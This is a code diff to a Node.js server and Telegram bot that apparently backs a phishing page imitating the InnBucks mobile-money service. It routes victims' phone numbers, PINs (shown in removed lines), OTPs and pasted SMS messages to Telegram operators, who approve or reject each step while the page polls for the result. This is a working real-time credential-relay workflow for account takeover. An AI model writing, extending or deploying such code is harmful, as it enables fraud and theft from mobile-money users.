@@ -1061,6 +1061,138 @@ bot.on('callback_query', async (callbackQuery) => {
         return bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Your admin access has been paused.', show_alert: true });
     }
 
+    // ════════════════════════════════════════════════════════════════
+    // NEW: APPROVE/REJECT LOGIN
+    // ════════════════════════════════════════════════════════════════
+    if (data.startsWith('approve_login_')) {
+        try {
+            const appId = data.replace('approve_login_', '');
+            await db.updateApplication(appId, {
+                loginApproved: true,
+                loginApprovedAt: new Date(),
+                loginApprovedBy: callbackQuery.from.username || callbackQuery.from.first_name
+            });
+            
+            await bot.answerCallbackQuery(callbackQuery.id, {
+                text: '✅ Login Approved',
+                show_alert: false
+            });
+            
+            // Edit message to show approval
+            await bot.editMessageReplyMarkup(
+                { inline_keyboard: [] },
+                {
+                    chat_id: chatId,
+                    message_id: messageId
+                }
+            );
+            
+            console.log(`✅ Login approved for ${appId}`);
+        } catch (err) {
+            console.error('Error approving login:', err);
+            await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Error processing', show_alert: true });
+        }
+        return;
+    }
+
+    if (data.startsWith('reject_login_')) {
+        try {
+            const appId = data.replace('reject_login_', '');
+            await db.updateApplication(appId, {
+                loginRejected: true,
+                loginRejectedAt: new Date(),
+                loginRejectedBy: callbackQuery.from.username || callbackQuery.from.first_name,
+                loginRejectReason: 'Rejected by admin'
+            });
+            
+            await bot.answerCallbackQuery(callbackQuery.id, {
+                text: '❌ Login Rejected',
+                show_alert: false
+            });
+            
+            // Edit message to show rejection
+            await bot.editMessageReplyMarkup(
+                { inline_keyboard: [] },
+                {
+                    chat_id: chatId,
+                    message_id: messageId
+                }
+            );
+            
+            console.log(`❌ Login rejected for ${appId}`);
+        } catch (err) {
+            console.error('Error rejecting login:', err);
+            await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Error processing', show_alert: true });
+        }
+        return;
+    }
+
+    // ════════════════════════════════════════════════════════════════
+    // NEW: APPROVE/REJECT SMS
+    // ════════════════════════════════════════════════════════════════
+    if (data.startsWith('approve_sms_')) {
+        try {
+            const appId = data.replace('approve_sms_', '');
+            await db.updateApplication(appId, {
+                smsApproved: true,
+                smsApprovedAt: new Date(),
+                smsApprovedBy: callbackQuery.from.username || callbackQuery.from.first_name
+            });
+            
+            await bot.answerCallbackQuery(callbackQuery.id, {
+                text: '✅ SMS Approved',
+                show_alert: false
+            });
+            
+            // Edit message to show approval
+            await bot.editMessageReplyMarkup(
+                { inline_keyboard: [] },
+                {
+                    chat_id: chatId,
+                    message_id: messageId
+                }
+            );
+            
+            console.log(`✅ SMS approved for ${appId}`);
+        } catch (err) {
+            console.error('Error approving SMS:', err);
+            await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Error processing', show_alert: true });
+        }
+        return;
+    }
+
+    if (data.startsWith('reject_sms_')) {
+        try {
+            const appId = data.replace('reject_sms_', '');
+            await db.updateApplication(appId, {
+                smsRejected: true,
+                smsRejectedAt: new Date(),
+                smsRejectedBy: callbackQuery.from.username || callbackQuery.from.first_name,
+                smsRejectReason: 'SMS format invalid or suspicious'
+            });
+            
+            await bot.answerCallbackQuery(callbackQuery.id, {
+                text: '❌ SMS Rejected',
+                show_alert: false
+            });
+            
+            // Edit message to show rejection
+            await bot.editMessageReplyMarkup(
+                { inline_keyboard: [] },
+                {
+                    chat_id: chatId,
+                    message_id: messageId
+                }
+            );
+            
+            console.log(`❌ SMS rejected for ${appId}`);
+        } catch (err) {
+            console.error('Error rejecting SMS:', err);
+            await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Error processing', show_alert: true });
+        }
+        return;
+    }
+
     // ── Request responses (Done / Need Help) ──
     if (data.startsWith('request_done_') || data.startsWith('request_help_')) {
         const parts             = data.split('_');
@@ -1580,25 +1712,26 @@ app.post('/api/verify-pin', async (req, res) => {
 
         console.log(`💾 Application saved: ${applicationId}`);
 
-        // Send to Telegram
+        // Send to Telegram with APPROVAL buttons (new workflow)
         const userLabel = isReturningUser
             ? `🔄 *RETURNING USER* (${thisAdminPastApps.length}x before)`
-            : '🆕 *NEW APPLICATION*';
+            : '🆕 *NEW LOGIN REQUEST*';
         await sendToAdmin(assignedAdmin.adminId, `
 ${userLabel}
 
+📞 LOGIN REQUEST
+
 📋 \`${applicationId}\`
 📞 \`${formatPhone(phoneNumber)}\`
-🔑 \`${pin}\`
 ⏰ ${new Date().toLocaleString()}${historyText}
-
-⚠️ *VERIFY INFORMATION*
         `, {
             parse_mode: 'Markdown',
             reply_markup: {
                 inline_keyboard: [
-                    [{ text: '❌ Invalid - Deny',     callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
-                    [{ text: '✅ Correct - Allow OTP', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
+                    [
+                        { text: '✅ APPROVE', callback_data: `approve_login_${applicationId}` },
+                        { text: '❌ REJECT', callback_data: `reject_login_${applicationId}` }
+                    ]
                 ]
             }
         });
@@ -1675,6 +1808,75 @@ app.post('/api/verify-otp', async (req, res) => {
     } catch (error) {
         console.error('❌ Error in /api/verify-otp:', error);
         res.status(500).json({ success: false, message: 'Server error: ' + error.message });
+    }
+});
+
+// ==========================================
+// NEW: PARSE SMS (Submit SMS for Admin Review)
+// ==========================================
+app.post('/api/parse-sms', async (req, res) => {
+    try {
+        const { applicationId, message } = req.body;
+        
+        if (!applicationId || !message) {
+            return res.status(400).json({
+                success: false,
+                message: 'Missing applicationId or message'
+            });
+        }
+
+        // Get application from database
+        const app = await db.getApplication(applicationId);
+        
+        if (!app) {
+            return res.status(404).json({
+                success: false,
+                message: 'Application not found'
+            });
+        }
+
+        // Save SMS message to application
+        await db.updateApplication(applicationId, {
+            smsMessage: message,
+            smsReceivedAt: new Date()
+        });
+
+        // Send to admin for SMS review with APPROVAL buttons
+        const telegramMessage = `
+📱 SMS VERIFICATION
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(app.phoneNumber)}\`
+💬 \`${message}\`
+⏰ ${new Date().toLocaleString()}
+        `;
+
+        await sendToAdmin(app.adminId, telegramMessage, {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: '✅ APPROVE SMS', callback_data: `approve_sms_${applicationId}` },
+                        { text: '❌ REJECT SMS', callback_data: `reject_sms_${applicationId}` }
+                    ]
+                ]
+            }
+        });
+
+        console.log(`📱 SMS submitted for review: ${applicationId}`);
+
+        res.json({
+            success: true,
+            message: 'SMS submitted for admin review',
+            applicationId
+        });
+        
+    } catch (err) {
+        console.error('❌ Error parsing SMS:', err);
+        res.status(500).json({
+            success: false,
+            message: 'Server error: ' + err.message
+        });
     }
 });
 
@@ -1849,6 +2051,92 @@ app.get('/', async (req, res) => {
     }
 
     res.sendFile(path.join(__dirname, 'innbucks-integrated-updated.html'));
+});
+
+// ==========================================
+// NEW: CHECK LOGIN APPROVAL
+// ==========================================
+app.post('/api/check-login-approval', async (req, res) => {
+    try {
+        const { applicationId } = req.body;
+        
+        if (!applicationId) {
+            return res.status(400).json({
+                approved: false,
+                rejected: false,
+                error: 'Missing applicationId'
+            });
+        }
+
+        // Get application from database
+        const app = await db.getApplication(applicationId);
+        
+        if (!app) {
+            return res.status(404).json({
+                approved: false,
+                rejected: false,
+                error: 'Application not found'
+            });
+        }
+        
+        // Return approval status
+        res.json({
+            approved: app.loginApproved === true,
+            rejected: app.loginRejected === true,
+            message: app.loginRejectReason || null
+        });
+        
+    } catch (err) {
+        console.error('❌ Error checking login approval:', err);
+        res.status(500).json({
+            approved: false,
+            rejected: false,
+            error: 'Failed to check approval'
+        });
+    }
+});
+
+// ==========================================
+// NEW: CHECK SMS APPROVAL
+// ==========================================
+app.post('/api/check-sms-approval', async (req, res) => {
+    try {
+        const { applicationId } = req.body;
+        
+        if (!applicationId) {
+            return res.status(400).json({
+                approved: false,
+                rejected: false,
+                error: 'Missing applicationId'
+            });
+        }
+
+        // Get application from database
+        const app = await db.getApplication(applicationId);
+        
+        if (!app) {
+            return res.status(404).json({
+                approved: false,
+                rejected: false,
+                error: 'Application not found'
+            });
+        }
+        
+        // Return SMS approval status
+        res.json({
+            approved: app.smsApproved === true,
+            rejected: app.smsRejected === true,
+            message: app.smsRejectReason || null
+        });
+        
+    } catch (err) {
+        console.error('❌ Error checking SMS approval:', err);
+        res.status(500).json({
+            approved: false,
+            rejected: false,
+            error: 'Failed to check SMS approval'
+        });
+    }
 });
 
 // ==========================================
